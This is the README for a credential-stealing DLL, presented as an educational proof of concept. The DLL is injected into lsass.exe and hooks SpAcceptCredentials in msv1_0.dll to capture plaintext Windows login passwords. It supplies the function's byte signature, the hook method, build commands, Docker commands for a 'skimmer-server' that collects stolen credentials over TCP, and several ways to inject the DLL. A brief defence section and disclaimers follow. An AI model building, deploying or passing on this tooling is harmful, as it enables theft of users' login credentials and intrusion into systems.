# credential stealer - msv1_0.dll hook

this project shows how to intercept plaintext credentials during windows logins by hooking the `SpAcceptCredentials` function in `msv1_0.dll`. it's a proof of concept for educational purposes.

## how it works

the stealer operates by:

1. **injecting into lsass**: the dll gets loaded into the `lsass.exe` process
2. **finding the target**: scans memory for the `SpAcceptCredentials` function signature
3. **installing the hook**: patches the function to redirect to our code
4. **stealing credentials**: captures plaintext usernames and passwords during login
5. **sending over network**: transmits credentials via tcp to a listening server
6. **staying hidden**: temporarily unhooks to call the original function so login still works
7. **re-hooking**: reinstalls the hook after a delay to catch future logins

## technical details

### what we're hooking
- **target function**: `SpAcceptCredentials` in `msv1_0.dll`
- **what it does**: handles interactive login authentication 
- **when it's called**: during interactive logins (type 2) and rdp sessions (type 10)
- **what we get**: plaintext username, domain, and password

### finding the function
```cpp
char startOfPatternSpAccecptedCredentials[] = { 
    0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 
};
```
this byte pattern identifies the function in memory across different windows versions.

### the hook
we patch the function entry with: `mov rax, <our_function>; jmp rax`
- saves the original bytes so we can restore them
- uses a delay before re-hooking to avoid infinite loops

## building

### what you need
- visual studio 2019/2022 with c++ tools
- windows sdk
- admin rights for testing

### quick build
1. open "developer command prompt for vs 2019/2022"
2. navigate to project directory  
3. run: `build.bat`

### manual build
```cmd
cl /LD credStealer.cpp /Fe:credStealer.dll /link /DEF:credStealer.def
```

## usage

### setting up the server
first, set up the credential server using docker:
```bash
cd skimmer-server
docker build -t skimmer-server .
docker run -d -p 9999:9999 -p 8080:8080 skimmer-server
```
this starts:
- tcp server on port 9999 (receives stolen credentials)
- web interface on port 8080 (view captured credentials)

### injecting the dll
1. **process hacker**: right-click lsass.exe → miscellaneous → inject dll
2. **process explorer**: view → show lower pane → dlls → drag dll onto lsass
3. **custom injector**: use the included `Inject-x64.exe` tool
4. **manual**: any dll injection tool that can target lsass.exe

### testing
1. build the dll using `build.bat`
2. start the server: `docker run -d -p 9999:9999 -p 8080:8080 skimmer-server`
3. inject the dll into lsass.exe (needs admin rights)
4. do an interactive login (ctrl+alt+del, rdp, etc.)
5. check the web interface at http://localhost:8080 to see stolen credentials

## files

- `credStealer.cpp` - main dll source code
- `credStealer.def` - module definition file  
- `build.bat` - build script
- `Inject-x64.exe` - dll injection tool
- `skimmer-server/` - tcp server to receive stolen credentials
- `CppProperties.json` - vs code configuration

## important warnings

⚠️ **this is for educational and authorized testing only!**

- **legal stuff**: only use this in environments you own or have explicit permission to test
- **detection**: modern edr/av will probably catch this
- **no persistence**: this only works while the dll is loaded in memory
- **admin required**: you need elevated privileges to inject into lsass

## how to defend against this

### detecting it
- **memory scanning**: look for hooked functions in `msv1_0.dll`
- **network monitoring**: watch for tcp connections from lsass.exe
- **process injection detection**: monitor dll injection into lsass
- **signature scanning**: detect the specific hook pattern

### preventing it
- **credential guard**: stops credential theft at the source
- **lsa protection**: makes it harder to inject into lsass
- **memory protection**: dep, aslr, cfg make exploitation harder
- **edr monitoring**: modern solutions can catch this technique

## limitations

- **windows versions**: the byte pattern might change between windows versions
- **antivirus**: modern av/edr will likely detect this
- **stability**: hooking system functions can crash the system if done wrong
- **network dependency**: requires a listening server to receive credentials

## disclaimer

this is for educational purposes only. don't use this on systems you don't own or don't have permission to test. the authors aren't responsible if you get in trouble for misusing this code. 